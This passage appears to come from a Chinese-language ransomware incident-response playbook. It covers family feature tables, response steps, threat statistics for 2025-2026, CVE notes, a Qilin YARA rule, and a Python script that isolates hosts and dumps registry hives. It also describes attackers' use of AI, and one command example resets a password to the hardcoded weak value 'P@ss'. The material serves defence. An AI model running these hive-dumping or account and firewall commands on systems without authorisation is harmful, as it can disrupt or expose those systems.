echo "Results: $passed passed, $failed failed, $warned warnings"
```

---

## 速查表

### 速查表 1：勒索软件家族特征矩阵

| 家族 | 扩展名 | 加密算法 | 文件标识 | RaaS | 已知解密工具 | 活跃时期 |
|------|--------|---------|---------|------|-------------|---------|
| LockBit 3.0 | .lockbit | AES-256+RSA | HLJknlSbe | 是 | Emsisoft (部分) | 2022-2024 |
| BlackCat | .blackcat | ChaCha20+RSA | README-{id}.txt | 是 | 无 | 2021-2024 |
| Cl0p | .Clop | AES+RSA | Cl0pReadMe.txt | 是 | 无 | 2019-2024 |
| Royal | .royal | AES+RSA | .royal_readme.txt | 是 | 无 | 2022-2023 |
| Play | .play | AES+RSA | 无 ransom note | 否 | 无 | 2022-2024 |
| Akira | .akira | AES+RSA | akira_readme.txt | 是 | 无 | 2023-2024 |
| Rhysida | .rhysida | AES-256+RSA | Rhysida-0.1 | 是 | 无 | 2023-2024 |
| Conti | .conti/.encrypted | AES-256+RSA | readme.txt | 是 | FBI (部分) | 2020-2022 |
| REvil | .revil | AES+RSA | readme.txt | 是 | Kaspersky (部分) | 2019-2021 |
| WannaCry | .WNCRY | AES-128+RSA | @WanaDecryptor@ | 否 | Wanakiwi | 2017 |

### 速查表 2：IR 响应决策树

```
收到勒索软件告警
│
├─ 确认是勒索软件？（检查文件扩展名、勒索信、加密行为）
│   ├─ 否 → 转为标准恶意软件 IR
│   └─ 是 ↓
│
├─ 影响范围？
│   ├─ 单台机器 → 隔离该机器 → 跳到 [根除]
│   ├─ 多台机器 → 网络级隔离（VLAN/交换机）↓
│   └─ 全域感染 → 全网隔离 + 外部 IR 支持动员 ↓
│
├─ 数据是否被窃取？（检查外泄指标）
│   ├─ 是 → 双重勒索场景 → 启动法律/PR 沟通
│   └─ 否 → 标准勒索场景
│
├─ [根除] 清除后门/持久化
│   ├─ 检查计划任务、服务、注册表启动项
│   ├─ 检查 WMI 订阅、GPO
│   └─ 重置所有凭据（包括 krbtgt）
│
├─ [恢复] 从不可变备份恢复
│   ├─ 按 P0→P1→P2→P3 优先级恢复
│   ├─ 验证数据完整性
│   └─ 测试业务功能
│
└─ [事后] 经验教训 → 更新 Playbook
```

### 速查表 3：关键命令速查

| 用途 | 命令 |
|------|------|
| **检测 — 查找加密进程** | `Get-Process \| Where-Object {$_.CPU -gt 50} \| Sort-Object CPU -Desc` |
| **检测 — 查找最近修改文件** | `Get-ChildItem -Recurse -Filter *.encrypted \| Sort LastWriteTime -Desc \| Select -First 20` |
| **遏制 — 禁用网卡** | `Disable-NetAdapter -Name "Ethernet" -Confirm:$false` |
| **遏制 — 防火墙全阻** | `netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound` |
| **遏制 — 禁用 AD 账户** | `Disable-ADAccount -Identity compromised_user` |
| **遏制 — 重置密码** | `Set-ADAccountPassword -Identity user -Reset -NewPassword (ConvertTo-SecureString "P@ss" -AsPlainText -Force)` |
| **取证 — 导出进程列表** | `tasklist /v > processes.txt` |
| **取证 — 导出网络连接** | `netstat -anob > connections.txt` |
| **取证 — 导出计划任务** | `schtasks /query /fo CSV /v > tasks.csv` |
| **取证 — 收集 MFT** | `.\KAPE.exe --target C: --destination E:\forensics --module KapeTriage` |
| **恢复 — 检查 VSS 残留** | `vssadmin list shadows` |
| **恢复 — 从 VSS 恢复** | `Copy-Item -Path "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\path\file" -Destination D:\recovered\` |

### 速查表 4：备份策略对比

| 策略 | 成本 | 恢复速度 | 防勒索保护 | RPO | 推荐场景 |
|------|------|---------|-----------|-----|---------|
| 本地磁盘备份 | 低 | 快 | 低（可能被加密） | 1-24h | 个人/小型 |
| NAS 备份 | 中 | 快 | 中 | 1-12h | 中型企业 |
| 云备份（S3/GLACIER） | 中 | 中 | 高（Object Lock） | 1-24h | 所有规模 |
| 磁带备份 | 高 | 慢 | 极高（离线） | 1-7d | 大型企业 |
| 不可变云存储 | 中 | 中 | 极高 | 1-24h | 所有规模（推荐） |
| 气隙备份 | 极高 | 慢 | 极高 | 1-7d | 关键基础设施 |

---

## MITRE ATT&CK 映射

| 战术 | 技术 ID | 技术名 | 对应阶段 |
|------|---------|--------|---------|
| 初始访问 | T1566 | 钓鱼邮件 | 初始访问 |
| 初始访问 | T1190 | 利用公开应用 | 初始访问 |
| 初始访问 | T1133 | 外部远程服务 | 初始访问 |
| 执行 | T1059.001 | PowerShell | 执行/加密 |
| 执行 | T1059.003 | Windows Cmd | 执行/加密 |
| 执行 | T1053 | 计划任务 | 持久化/执行 |
| 持久化 | T1078 | 有效账户 | 持久化 |
| 持久化 | T1098 | 账户操纵 | 持久化 |
| 权限提升 | T1068 | 漏洞利用提权 | 权限提升 |
| 权限提升 | T1548 | 滥用提权机制 | 权限提升 |
| 防御规避 | T1562 | 禁用安全工具 | 加密前准备 |
| 防御规避 | T1070 | 清除日志 | 防御规避 |
| 防御规避 | T1490 | 禁用系统恢复（VSS 删除） | 加密前准备 |
| 凭据访问 | T1003 | 操作系统凭据导出 | 凭据窃取 |
| 凭据访问 | T1558 | Kerberoasting | 凭据窃取 |
| 横向移动 | T1021 | 远程服务（RDP/SMB/WMI） | 横向移动 |
| 横向移动 | T1570 | Lateral Tool Transfer | 横向移动 |
| 数据窃取 | T1567 | 通过 Web 服务外泄 | 数据窃取 |
| 数据窃取 | T1048 | 替代协议外泄 | 数据窃取 |
| 影响 | T1486 | 数据加密（勒索软件） | 加密 |
| 影响 | T1490 | 抑制系统恢复 | 加密前准备 |
| 影响 | T1498 | 网络拒绝服务 | 影响 |
| 影响 | T1499 | 终端拒绝服务 | 影响 |

---

## 前置条件

### 所需工具
| 工具 | 用途 | 获取方式 |
|------|------|---------|
| Velociraptor | 端点取证采集 | https://docs.velociraptor.app/ |
| KAPE | 快速取证采集 | https://www.kroll.com/kape |
| FLARE VM | 恶意软件分析环境 | https://github.com/mandiant/flare-vm |
| Volatility 3 | 内存取证 | https://github.com/volatilityfoundation/volatility3 |
| YARA | 恶意软件特征匹配 | https://github.com/VirusTotal/yara |
| CyberChef | 数据解码/分析 | https://gchq.github.io/CyberChef/ |
| IDA Pro/Ghidra | 勒索软件逆向分析 | 商用/开源 |
| Veeam/Commvault | 备份恢复 | 商用 |
| Sysinternals | 系统诊断 | https://learn.microsoft.com/sysinternals |

### 所需权限
- 域管理员（AD 遏制、GPO 部署）
- 网络管理员（交换机/防火墙配置）
- 备份管理员（恢复操作）
- EDR 管理员（隔离/采集）

### 所需数据源
- EDR 端点遥测数据
- Windows 事件日志（Security/System/PowerShell）
- Sysmon 日志
- 网络设备日志（防火墙/IDS/代理）
- AD 审计日志
- 云平台日志（CloudTrail/Activity Log）

---

## Part C：2025-2026 前沿补充

### C.1 勒索软件威胁态势重大更新（2025-2026）

#### C.1.1 攻击量与速度剧变

```
关键数据（2025-2026）：
- 泄漏网站公布受害者数量同比跃升 ~58%（GuidePoint 记录 7500+ 组织）
- 44% 的数据泄露事件涉及勒索软件（从 32% 上升，Verizon DBIR 2025）
- 2025年1-10月美国勒索攻击增加 50%（5010 vs 3335 起）
- 针对政府机构攻击增加 65%（208 起，VikingCloud）
- 2026年全球勒索损失预计达 740 亿美元（SentinelOne）
- 2026年Q1 公开披露 264 起攻击（QoQ -15%，转向更隐蔽的窃取）
```

**攻击生命周期压缩至极限：**

| 指标 | 2024 | 2025 | 变化 |
|------|------|------|------|
| 中位驻留时间 | ~10 天 | **~4 天** | -60% |
| 最快加密时间 | ~24h | **<6h** | -75% |
| 外泄速度 | 基准 | **4x 加速** | +300% |
| 夜间/周末攻击占比 | ~55% | **69%** | +14pp |

来源：Sophos/Splunk, Unit 42 IR Report, Bluewave, Halcyon 2025 Report

#### C.1.2 生态系统碎片化——LockBit 后的新格局

```
2025年 Cyble 发现 57 个新团伙 + 27 个新勒索团伙 + 350+ 变种
Black Kite 追踪 6046 名受害者（YoY +24%），96 个活跃团伙
执法行动导致碎片化而非减少：更小更分散的团伙激增
```

**2025年顶级家族排名：**

| 排名 | 家族 | 市场份额 | 特征 | 重大事件 |
|------|------|---------|------|---------|
| 1 | **Qilin (Agenda)** | 29%（10月） | 利用 Fortinet 漏洞 | CVE-2024-55591；单月 73 受害者 |
| 2 | **CL0p** | 稳定 | 供应链攻击为主 | ALPHV/LockBit 关闭后最稳定 |
| 3 | **Play** | ~900 实体 | 无勒索信 | FBI 数据截至 2025.05 |
| 4 | **Akira** | 快速增长 | Linux/ESXi | VPN 漏洞利用 |
| 5 | **Medusa** | 扩张中 | 三重勒索 | DDoS + 加密 + 泄露 |
| 6 | **RansomHub** | 填补真空 | ALPHV 附属分散 | 退出后扩张 |
| 7 | **NightSpire** | 新兴 | 工业目标 | Q2 声称 17 起事件 |
| 8 | **FunkSec** | 有争议 | 重复使用旧泄露 | 可信度问题 |

来源：Broadcom/NCC Group, Akamai, FBI, Dragos, Rapid7

**LockBit 死灰复燃：**

```
2025.05 — 执法行动"致命打击"
2026.Q1 — 死灰复燃，163 名受害者（QoQ +106%）
教训：执法打击造成短期破坏，但长期效果有限
来源：Check Point Q1 2026
```

#### C.1.3 四重勒索演进与内部人员招募

**勒索模式演进时间线：**

```
2020: 单一勒索（仅加密）
2021: 双重勒索（加密 + 数据泄露威胁）—— 2025 年 96% 案例标准
2023: 三重勒索（+ DDoS 攻击）
2024: 四重勒索（+ 监管举报/客户通知威胁）
2025: 五重勒索 — 内部人员招募（全新且最具破坏性）
```

**2025-2026 最具破坏性的新战术——内部人员招募：**

```python
"""
勒索软件团伙内部人员招募模式（Recorded Future 2026）：
1. 通过 Telegram/暗网论坛招募目标组织员工
2. 提供 $500-$5000 酬金植入恶意软件或提供 RDP 凭据
3. 利用零工经济人员提供物理访问（USB 投递）
4. BBC 记者曾被招募案例被公开报道

防御措施：
- 员工安全意识培训增加"被招募"场景
- 异常远程访问行为检测（非工作时间/非标准位置）
- USB 设备控制策略强化
- 内部威胁检测程序（UEBA）
"""
```

**收入悖论——攻击增加但收入下降：**

| 指标 | 2024 | 2025 | 变化 |
|------|------|------|------|
| 攻击量 | 基准 | **+47~58%** | 大幅上升 |
| 勒索收入 | ~$1.2B | **~$850M** | **-35%** |
| 支付率 | ~46% | **~28%** | -18pp |

来源：Chainalysis, TRM Labs, Recorded Future
原因：执法压力、监管不鼓励支付、更好的备份恢复能力

### C.2 AI/LLM 在勒索软件攻防中的应用

#### C.2.1 攻击者侧——AI 武器化

```
AI 增强勒索软件攻击链：
├─ 初始访问：LLM 生成高度定制化钓鱼邮件（多语言、上下文感知）
├─ 侦察：AI 自动化网络映射和数据定位
├─ 横向移动：自适应加密策略，AI 选择最高价值目标
├─ 规避：ML 驱动的沙箱检测和 EDR 规避
└─ 勒索谈判：AI 聊天机器人自动化谈判过程
```

**2025年 AI 漏洞率达历史最高 4.42%（Trend Micro）**

#### C.2.2 防御者侧——AI 加速响应

```python
"""
AI 增强勒索软件响应框架：

1. 检测加速
   - AI 行为分析：异常文件操作模式识别（提前 15-30 分钟预警）
   - 检测复杂威胁时间减少 73%（Valorem Reply）
   - AI 驱动的 Sigma 规则自动生成

2. 响应自动化
   - Agentic AI SOC：自主事件分流和遏制建议
   - AI 驱动的网络隔离决策（基于攻击路径分析）
   - 自动化遏制 Playbook 执行

3. 恢复优化
   - AI 辅助恢复优先级排序（业务影响分析自动化）
   - 备份完整性 AI 验证（异常检测替代哈希比对）
   - AI 生成恢复验证测试用例

4. 学术前沿
   - BIPS（行为完整性保护系统）— AI 驱动系统勒索防护（MDPI）
   - 预测性分析：基于历史数据的勒索攻击概率预测（SentinelOne）
"""
```

### C.3 CISA/政府指导更新（2025-2026）

#### C.3.1 CISA 勒索软件指南更新

| 时间 | 更新 | 新增内容 |
|------|------|---------|
| 2025.03 | **#StopRansomware Guide 更新版** | 云备份指导、ZTA 集成 |
| 2025.06 | **Play 勒索软件公告更新** | 新 TTPs + IOCs |
| 2025.12 | **CPG 2.0** | 覆盖 IT + OT 环境 |
| 持续 | **KEV 目录静默更新** | 59 个漏洞标记为"已知勒索软件利用" |

来源：CISA, FBI/IC3, GreyNoise

#### C.3.2 关键 CVE 与利用链

```yaml
# 2025-2026 勒索软件相关关键 CVE
critical_cves:
  - id: CVE-2024-55591
    product: FortiOS/FortiProxy
    severity: 9.6 Critical
    exploited_by: Qilin（2025年顶级团伙）
    impact: 未认证管理员访问 → 初始访问 → 勒索部署
    detection: |
      # FortiOS 日志检查
      execute log filter category "event"
      execute log display | grep -i "admin" | grep -v "127.0.0.1"
    mitigation: "升级至 FortiOS 7.6.x / 7.4.12+"

  - id: CVE-2025-59718
    product: FortiCloud SSO
    severity: Critical
    type: 身份验证绕过
    note: CVE-2025-59719 为相关漏洞

  - id: CVE-2025-24813
    product: Apache Tomcat
    severity: 9.8 Critical
    impact: Partial PUT → 反序列化 RCE
    exploited_in: 供应链勒索场景
```

### C.4 新兴勒索软件家族加密特征（2025-2026）

#### C.4.1 Qilin/Agenda 深度特征

```
Qilin (Agenda) Ransomware — 2025年最活跃家族：

技术特征：
- 语言：Rust + Go 双版本
- 加密：AES-256-CTR + RSA-4096
- 横向移动：PsExec + WMI + 自定义工具
- 数据外泄：Rclone + 自定义工具
- EDR 规避：间接系统调用 + Sleep Obfuscation
- 特有：利用 Fortinet 设备作为持久入口点

YARA 规则更新：
```

```yara
rule Qilin_Agenda_Ransomware_2025 {
    meta:
        description = "Qilin/Agenda Ransomware 2025 Variant"
        author = "security-team"
        date = "2025-06-01"
        reference = "CVE-2024-55591 exploitation"
    strings:
        $s1 = "Qilin" ascii nocase wide
        $s2 = ".qilin" ascii wide
        $s3 = "Agenda" ascii nocase wide
        $rust1 = "rust_begin_unwind" ascii
        $go1 = "runtime.goexit" ascii
        $encrypt1 = { 48 8B ?? E8 ?? ?? ?? ?? 48 85 C0 74 } // AES-NI
        $config1 = "RECOVER" ascii wide
        $config2 = "INTERVAL" ascii wide
    condition:
        ($s1 or $s2 or $s3) and
        ($rust1 or $go1) and
        filesize < 20MB
}
```

#### C.4.2 Weaxor（中国首要威胁）

```
Weaxor — 2025年中国感染排名第一（~36-40%）：

技术特征：
- 利用用友 U8Cloud 历史文件上传漏洞
- 双重勒索模式（加密 + 数据泄露）
- 部分月份占中国勒索处理量的 36-40%
- 勒索金额从八位数下降至较低水平

检测命令：
# 检查用友 U8Cloud 文件上传漏洞利用痕迹
Get-ChildItem -Path "C:\*" -Recurse -Include "*.weaxor" -ErrorAction SilentlyContinue
Get-WinEvent -LogName Security | Where-Object {$_.Message -match "weaxor"}

来源：360 勒索软件年度报告, 微步在线
```

#### C.4.3 2025-2026 新兴家族速查矩阵

| 家族 | 出现时间 | 语言 | 加密算法 | 目标 | 特征 |
|------|---------|------|---------|------|------|
| NightSpire | 2025.Q2 | — | AES+RSA | 工业组织 | 双重勒索，17 起事件 |
| AiLock | 2025 | — | — | 关键基础设施 | 新兴，目标集中 |
| Crux | 2025 | — | — | 关键基础设施 | 新兴 |
| FunkSec | 2025 | — | — | 通用 | 重复使用旧泄露，可信度问题 |
| RNTC | 2025 | — | — | 中国市场 | 新家族，迅速进入前十（22.3%） |
| Makop | 持续 | — | AES+RSA | 中国市场 | 持续前三（15.5%） |

### C.5 IR Playbook 增强——适配超短驻留时间

#### C.1 自动化快速遏制 Playbook（应对 <6h 加密）

```python
#!/usr/bin/env python3
"""
勒索软件快速遏制自动化脚本
设计目标：从检测到遏制 <15 分钟
适配 2025 年攻击者 <6h 加密速度
"""
import subprocess
import json
import time
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("RansomwareContainment")

# Phase 1: 检测验证 (< 2 分钟)
def verify_ransomware_indicators(hostname):
    """快速验证勒索软件指标"""
    indicators = {
        "mass_file_rename": False,
        "ransom_note": False,
        "vss_deletion": False,
        "encryption_process": False
    }
    # 检查批量文件重命名
    result = subprocess.run(
        ["ssh", hostname, "powershell -Command \"Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational -MaxEvents 1000 | Where-Object {$_.Message -match 'encrypted|locked|crypto'} | Measure-Object | Select-Object -ExpandProperty Count\""],
        capture_output=True, text=True, timeout=30
    )
    if int(result.stdout.strip()) > 50:
        indicators["mass_file_rename"] = True
    return indicators

# Phase 2: 自动隔离 (< 3 分钟)
def isolate_host(hostname, ir_team_ip="10.0.0.100"):
    """通过 WinRM/SSH 隔离受感染主机"""
    logger.info(f"Isolating {hostname}...")
    # 阻止所有流量，允许 IR 团队
    commands = [
        f'netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound',
        f'netsh advfirewall firewall add rule name="IR Access" dir=in action=allow remoteip={ir_team_ip}/32',
        f'netsh advfirewall firewall add rule name="IR Access Out" dir=out action=allow remoteip={ir_team_ip}/32',
    ]
    for cmd in commands:
        subprocess.run(["ssh", hostname, cmd], timeout=15)
    logger.info(f"{hostname} isolated successfully")

# Phase 3: 证据保全 (< 5 分钟)
def preserve_evidence(hostname, evidence_server="10.0.0.100"):
    """快速保全关键证据"""
    logger.info(f"Preserving evidence from {hostname}...")
    evidence_commands = [
        "tasklist /v > C:\\temp\\processes.txt",
        "netstat -anob > C:\\temp\\connections.txt",
        "wmic process list full > C:\\temp\\wmic_processes.txt",
        "schtasks /query /fo CSV /v > C:\\temp\\tasks.csv",
        "reg save HKLM\\SOFTWARE C:\\temp\\software.hiv",
        "reg save HKLM\\SYSTEM C:\\temp\\system.hiv",
    ]
    for cmd in evidence_commands:
        subprocess.run(["ssh", hostname, cmd], timeout=15)
    logger.info("Evidence preserved")

if __name__ == "__main__":
    target = "compromised-host"
    start = time.time()
    indicators = verify_ransomware_indicators(target)
    if any(indicators.values()):
        isolate_host(target)
        preserve_evidence(target)
    elapsed = time.time() - start
    logger.info(f"Containment completed in {elapsed:.0f} seconds")
```

### C.6 工具生态更新

| 工具 | 版本/更新 | 新功能 |
|------|---------|--------|
| Velociraptor | v0.74+ | 勒索软件专项 VQL 查询、自动遏制 |
| Halcyon | 2025 Report | 勒索软件专用反规避引擎 |
| No More Ransom | 持续更新 | 200+ 免费解密工具（Europol） |
| ID Ransomware | Emsisoft | 在线家族识别，470+ 家族 |
| KAPE | 2025 | 自动化勒索软件证据采集模块 |
| Crypto Sheriff | No More Ransom | 文件识别 → 解密工具推荐 |

### C.7 中文社区精华参考

| 来源 | 内容 | 链接 |
|------|------|------|
| 360 勒索软件年度报告 | 5858 起攻击/1639 组织/62 家族，Weaxor 排名第一 | https://www.360.cn/n/12899.html |
| 安全客 | 2025 勒索攻击激增 47%，团伙碎片化+静默入侵战术 | https://www.anquanke.com/post/id/314260 |
| 安全客 | Qilin 利用 Fortinet 关键漏洞 | https://www.anquanke.com/tag/%E6%BC%8F%E6%B4%9E |
| 阿里云 | 月度安全态势报告（数据库加密/DDoS/凭证窃取） | https://help.aliyun.com/zh/acsg/security-posture-report-december-2025 |
| 深信服 | 2024 IR 报告 3000+ 事件/6 种典型场景/15 案例 | https://www.sangfor.com.cn/news/cf4dd9230bb449b6a4ebb191091bfd55 |
| 微步在线 | Weaxor 利用用友 U8Cloud 漏洞 | https://x.threatbook.com/v5/article?threatInfoID=161390 |
| 中国日报 | AI 作为未来勒索对抗决胜因素 | http://cn.chinadaily.com.cn/a/202601/16/WS6969eecda310942cc499b920.html |
| FreeBuf | 勒索软件防御与响应最佳实践 | https://www.freebuf.com/articles/network/ |

### C.8 防御升级路线图

```
P0 立即执行（<1 周）：
├─ 部署 AI 增强检测规则（文件操作异常 + 行为分析）
├─ 验证备份不可变性（S3 Object Lock / 磁带 / 气隙）
├─ 更新 FortiOS 至 7.4.12+（CVE-2024-55591）
├─ 部署内部人员威胁检测（异常远程访问/USB）
└─ 测试 <15 分钟自动遏制 Playbook

P1 短期改进（<1 月）：
├─ 实施 CISA #StopRansomware Guide 2025 更新
├─ ZTA 集成（微分段 + 持续验证）
├─ 夜间/周末告警增强（69% 攻击发生在此时段）
├─ 勒索软件桌面演练（新增内部人员招募场景）
└─ 更新 Sigma/YARA 规则集（Qilin/Weaxor/NightSpire）

P2 中期建设（<3 月）：
├─ AI SOC 响应自动化（Agentic AI 分流）
├─ CPG 2.0 合规评估（IT + OT 覆盖）
├─ 云备份恢复测试（AWS/Azure/GCP 不可变备份）
├─ OT 环境勒索软件专项防护
└─ 勒索谈判应急预案更新（含 AI 自动化谈判应对）

P3 长期战略（<6 月）：
├─ AI 驱动预测性勒索攻击分析
├─ 供应链勒索风险评估与缓解
├─ BIPS 行为完整性保护系统评估
├─ 全组织勒索文化转型（从技术到管理到董事会）
└─ 跨组织威胁情报共享（MISP/FBI InfraGard）
```

---

## MITRE ATT&CK 扩展映射（v18/v19 更新）

| 战术 | 技术 ID | 技术名 | 2025-2026 变化 |
|------|---------|--------|---------------|
| 初始访问 | T1190 | 利用公开应用 | +CVE-2024-55591(Qilin) |
| 初始访问 | T1133 | 外部远程服务 | +VPN 漏洞利用增加 |
| 防御规避 | T1497 | 虚拟化/沙箱规避 | +AI 驱动规避 |
| 横向移动 | T1021 | 远程服务 | +间接系统调用 |
| 数据窃取 | T1567 | Web 服务外泄 | +4x 外泄加速 |
| 影响 | T1486 | 数据加密 | +<6h 加密速度 |
| 影响 | T1490 | 禁用系统恢复 | +COM 对象隐蔽删除 |
| 影响 | — | 四重/五重勒索 | +内部人员招募（新） |
| 影响 | — | DDoS 即服务 | +RaaS 标准附加服务 |
